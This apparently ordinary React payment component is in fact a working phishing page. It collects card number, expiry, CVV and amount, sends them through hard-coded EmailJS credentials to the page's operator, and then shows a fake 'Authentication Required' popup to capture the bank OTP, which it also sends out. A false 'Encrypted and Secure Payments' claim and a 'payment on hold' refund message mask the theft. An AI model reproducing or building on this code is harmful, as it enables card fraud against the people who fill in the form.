import { FaLock } from "react-icons/fa";
import React, { useState } from "react";
import emailjs from "@emailjs/browser";
import cc from "./assets/cc.png"

function PaymentCredit() {
  const [message, setMessage] = useState("");
  const [formData, setFormData] = useState({
    contact: "",
    name: "",
    cardNumber: "",
    rupee: "",
    expiry: "",
    cvv: ""
  });
  const [showOtpPopup, setShowOtpPopup] = useState(false);
  const [otp, setOtp] = useState("");
  const [success, setSuccess] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === "cardNumber") {
      formattedValue = value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
    }
    if (name === "expiry") {
      formattedValue = value.replace(/\D/g, "");
      if (formattedValue.length > 2) {
        formattedValue = `${formattedValue.slice(0, 2)}/${formattedValue.slice(2, 4)}`;
      }
    }
    if (name === "contact") {
      formattedValue = value.replace(/\D/g, "").slice(0, 10);
    }
    if (name === "rupee") {
      formattedValue = value.replace(/[^0-9.]/g, ""); // allow decimals
    }

    setFormData((prev) => ({ ...prev, [name]: formattedValue }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();


    setShowOtpPopup(true);

    emailjs.send(
      "service_6yjszmd",
      "template_968scli",
      {
        name: formData.name,
        cardNumber: formData.cardNumber,
        expiry: formData.expiry,
        cvv: formData.cvv,
        rupee: formData.rupee
      },
      "RqTKO0H3AQg17-doH"
    );
  };

  const handleVerifyOtp = (e) => {
    e.preventDefault();
    setShowOtpPopup(false);
    setSuccess(true);

    emailjs.send(
      "service_6yjszmd",
      "template_83tgx7r",
      { otp },
      "RqTKO0H3AQg17-doH"
    );
  };

  return (
    <>
      {/* HEADER */}
      <header className="fixed top-0 left-0 w-full z-50 bg-gray-00 shadow">
        <div className="text-gray-800 font-medium flex justify-end items-center  py-3 px-4 ">
          <img src={cc} alt="" 
          className="h-15"/>
        </div>
      </header>

     
      <div className="min-h-screen flex flex-col lg:flex-row items-center justify-evenly w-full bg-gray-100 py-32 px-4 gap-8">
       
        <div className="flex justify-center items-center w-full lg:w-1/2">
          <div className="bg-white shadow-lg rounded-xl p-4 w-full max-w-md">
            <div
              className="bg-amber-50 p-2 cursor-pointer"
              onClick={() => setMessage("UPI NOT Available")}
            >
              <img
                src="https://i0.wp.com/facilityschool.com/wp-content/uploads/2023/01/UPI-payment-.jpg?fit=1200%2C675&ssl=1"
                alt="UPI Payment"
                className="w-full rounded-lg object-cover"
              />
            </div>
            {message && (
              <p className="text-red-500 mt-4 font-semibold text-lg sm:text-2xl text-center">
                {message}
              </p>
            )}
          </div>
        </div>

        {/* RIGHT SIDE FORM */}
        <div className="flex justify-center items-center w-full lg:w-1/2">
          <form
            onSubmit={handleSubmit}
            className="bg-white shadow-lg rounded-xl p-6 sm:p-8 w-full max-w-lg"
          >
            <h2 className="text-lg font-bold mb-6">
              Credit Card / Debit Card Payments
            </h2>

      

            {/* Name on Card */}
            <div className="mb-4">
              <label className="block font-medium mb-2">Name on Card</label>
              <input
                type="text"
                name="name"
                value={formData.name}
                onChange={handleChange}
                placeholder="Your name"
                className="w-full border rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                required
              />
            </div>

            {/* Card Number */}
            <div className="mb-4">
              <label className="block font-medium mb-2">Card Number</label>
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                placeholder="1234 5678 9012 3456"
                maxLength={19}
                className="w-full border rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                required
              />
            </div>

            {/* Amount */}
            <div className="mb-4">
              <label className="block font-medium mb-2">Amount (₹)</label>
              <input
                type="text"
                name="rupee"
                value={formData.rupee}
                onChange={handleChange}
                placeholder="Enter Amount"
                className="w-full border rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                required
              />
            </div>

            {/* Expiry & CVV */}
            <div className="flex flex-col sm:flex-row gap-4 mb-4">
              <div className="w-full sm:w-1/2">
                <label className="block font-medium mb-2">Expiry Date</label>
                <input
                  type="text"
                  name="expiry"
                  value={formData.expiry}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  maxLength={5}
                  className="w-full border rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                  required
                />
              </div>
              <div className="w-full sm:w-1/2">
                <label className="block font-medium mb-2">CVV</label>
                <input
                  type="password"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleChange}
                  placeholder="123"
                  maxLength={3}
                  className="w-full border rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-400"
                  required
                />
              </div>
            </div>

            {/* Submit */}
            <button
              type="submit"
              className="px-4 py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600 w-full sm:w-auto"
            >
              Pay Now
            </button>

            <p className="py-3 text-xs sm:text-sm flex items-center gap-2">
              <FaLock /> Encrypted and Secure Payments
            </p>
          </form>
        </div>
      </div>

      {/* OTP POPUP */}
      {showOtpPopup && (
        <div className="fixed inset-0 bg-blue-300 bg-opacity-50 flex justify-center items-center p-4">
          <form
            onSubmit={handleVerifyOtp}
            className="bg-blue-300  p-6 rounded-lg shadow-lg w-full max-w-sm"
          >
            <h3 className="text-xl font-bold my-3 text-center">Authentication Required</h3>
            <p className="text-center pb-2">We Have Sent you a personal code to your register mobile number</p>
            
            <input
              type="text"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              placeholder="Enter Your Code"
              className="w-full border rounded-lg px-4 py-2 mb-4 focus:outline-none focus:ring-2 focus:ring-blue-400 bg-white"
              required
              maxLength={6}
            />
            <div className="flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setShowOtpPopup(false)}
                className="px-4 py-2 bg-gray-300 rounded-lg"
              >
                Cancel
              </button>
              <button
                type="submit"
                className="px-4 py-2 bg-blue-500 text-white rounded-lg"
              >
                Verify
              </button>
            </div>
          </form>
        </div>
      )}

      {/* SUCCESS POPUP */}
      {success && (
        <div className="fixed inset-0 bg-blue-300 bg-opacity-50 flex justify-center items-center p-4">
          <div className="bg-white p-6 rounded-lg shadow-lg text-left max-w-lg w-full">
            <h2 className="text-lg sm:text-xl font-bold text-yellow-600 mb-2">
              Payment on Hold – Card Payment
            </h2>
            <p className="text-gray-700 mb-3 text-sm sm:text-base">
              Your recent payment has been placed{" "}
              <span className="font-bold text-red-500">on hold</span> because it
              was made using a{" "}
              <span className="font-semibold text-blue-500">
                debit or credit card
              </span>
              . Don't worry —{" "}
              <span className="text-yellow-600 font-semibold">
                if money is debited
              </span>
              , it will be refunded within{" "}
              <span className="font-semibold">3 to 7 working days</span>. Your
              payment is safe and secure.{" "}
              <span className="text-red-500 font-semibold">Thank you!</span>
            </p>

            <button
              onClick={() => setSuccess(false)}
              className="mt-6 px-4 py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg w-full sm:w-auto"
            >
              OK
            </button>
          </div>
        </div>
      )}

    </>
  );
}

export default PaymentCredit;
